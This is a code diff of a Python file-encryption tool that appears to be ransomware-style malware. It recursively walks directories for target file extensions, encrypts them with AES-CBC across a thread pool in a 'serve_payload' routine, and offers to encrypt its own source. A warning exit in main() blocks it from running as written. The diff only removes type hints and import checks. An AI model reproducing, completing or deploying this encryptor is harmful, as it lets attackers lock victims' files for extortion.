@@ -22,21 +22,13 @@ import argparse
 
 from getpass import getpass
 from time import time
-from typing import Any, Union, Generator
+from concurrent.futures import ThreadPoolExecutor
+from base64 import encodebytes
+from tqdm import tqdm
 
-try:
-    from concurrent.futures import ThreadPoolExecutor
-    from base64 import encodebytes
-except ImportError:
-    raise ImportError("Python3.7 is required for usage")
-
-try:
-    from tqdm import tqdm
-    from Crypto import Random
-    from Crypto.Hash import SHA256
-    from Crypto.Cipher import AES
-except ImportError:
-    raise ImportError("Dependencies not satisfied. Install requirements.txt to continue")
+from Crypto import Random
+from Crypto.Hash import SHA256
+from Crypto.Cipher import AES
 
 # --------------------------------------------------------------------------
 
@@ -142,7 +134,7 @@ class AesExcalibur:
 #****************************************************************************************************#
  """
 
-    def __init__(self, password: bytes):
+    def __init__(self, password):
         """
 
         :param password: Base64 encoded string to be hashed
@@ -155,16 +147,16 @@ class AesExcalibur:
         return Colors.green + "Total number of files modified: {}".format(self.total)
 
     @staticmethod
-    def pad(message: bytes):
+    def pad(message):
         return message + b"\0" * (AES.block_size - len(message) % AES.block_size)
 
-    def encrypt(self, plain_text: bytes):
+    def encrypt(self, plain_text):
         padded_text = self.pad(plain_text)
         iv = Random.new().read(AES.block_size)
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
         return iv + cipher.encrypt(padded_text)
 
-    def decrypt(self, cipher_text: bytes):
+    def decrypt(self, cipher_text):
         iv = cipher_text[:AES.block_size]
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
         plaintext = cipher.decrypt(cipher_text[AES.block_size:])
@@ -277,7 +269,7 @@ def serve_payload(mode, password):
     # Initialize encryption object in memory (Also encrypts key)
     sanctuary = AesExcalibur(encoded_pass)
 
-    files: Generator[Union[bytes, str], Any, Any] = recursive_walk(paths, target_extensions, mode)
+    files = recursive_walk(paths, target_extensions, mode)
 
     # Serve payload in with max 25 threads in the thread pool (experiment with this number with high IO)
     with ThreadPoolExecutor(max_workers=25) as pool:
@@ -309,7 +301,7 @@ def serve_payload(mode, password):
     if answer in ["y", "Y", "yes", "YES"]:
         sanctuary.encrypt_file(os.path.abspath(__file__))
     else:
-        exit(0)
+        sys.exit(0)
 
 # --------------------------------------------------------------------------
 
@@ -325,6 +317,7 @@ def main(args=None):
 
     os.system("clear" if "linux" in sys.platform else "cls")
     exit(Colors.red + "THIS WILL HARM YOUR COMPUTER")
+
     print(Colors.blue + ascii_art)
 
     # If user entered any arguments, run them through parse_args()
